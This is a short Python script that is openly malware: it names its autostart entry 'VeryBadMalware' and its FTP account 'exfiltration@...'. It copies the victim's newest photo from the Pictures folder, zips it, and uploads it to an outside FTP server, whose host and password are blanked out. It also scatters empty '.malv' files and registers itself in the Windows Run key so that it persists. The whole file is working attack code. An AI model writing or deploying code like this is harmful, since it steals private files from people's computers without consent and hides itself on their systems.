icon_path = 'icon.ico'

import os
import uuid
import shutil
import glob
import zipfile
import ftputil
import winreg

def find_newest_picture():
    pictures_dir = os.path.join(os.path.expanduser("~"), "Pictures")
    picture_files = glob.glob(os.path.join(pictures_dir, "*.jpg")) + glob.glob(os.path.join(pictures_dir, "*.png"))
    if picture_files:
        newest_picture = max(picture_files, key=os.path.getctime)
        return newest_picture
    else:
        return None

def copy_newest_picture_to_root():
    newest_picture = find_newest_picture()
    if newest_picture:
        shutil.copy(newest_picture, os.path.basename(newest_picture))
        print(f"Newest picture '{newest_picture}' copied to root directory.")
        return os.path.basename(newest_picture)
    else:
        print("No pictures found in the Pictures folder.")
        return None

def create_empty_files_and_copy_picture(num_files):
    create_empty_files(num_files)
    copied_picture = copy_newest_picture_to_root()
    if copied_picture:
        archive_picture(copied_picture)
        send_to_ftp()

def create_empty_files(num_files):
    for _ in range(num_files):
        filename = str(uuid.uuid4()) + '.malv'
        with open(filename, 'w') as file:
            pass  # Empty block
        print(f"Empty file '{filename}' created.")

def archive_picture(picture_name):
    archive_name = "pictures_archive.zip"
    with zipfile.ZipFile(archive_name, 'w') as archive:
        archive.write(picture_name)
    print(f"Picture '{picture_name}' archived as '{archive_name}'.")

def send_to_ftp():
    ftp_host = '#'
    ftp_user = 'exfiltration@versaintel.lv'
    ftp_password = '#'
    archive_name = "pictures_archive.zip"
    
    with ftputil.FTPHost(ftp_host, ftp_user, ftp_password) as ftp:
        ftp.upload(archive_name, archive_name)
    
    print(f"Archive '{archive_name}' sent to FTP server.")

def add_to_autostart():
    exe_path = os.path.abspath(__file__)
    key_name = 'VeryBadMalware'
    key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, exe_path)
    winreg.CloseKey(key)
    print(f"Added '{key_name}' to Windows autostart.")

if __name__ == '__main__':
    num_files = 20
    create_empty_files_and_copy_picture(num_files)
    add_to_autostart()
    input("Press Enter to exit...")
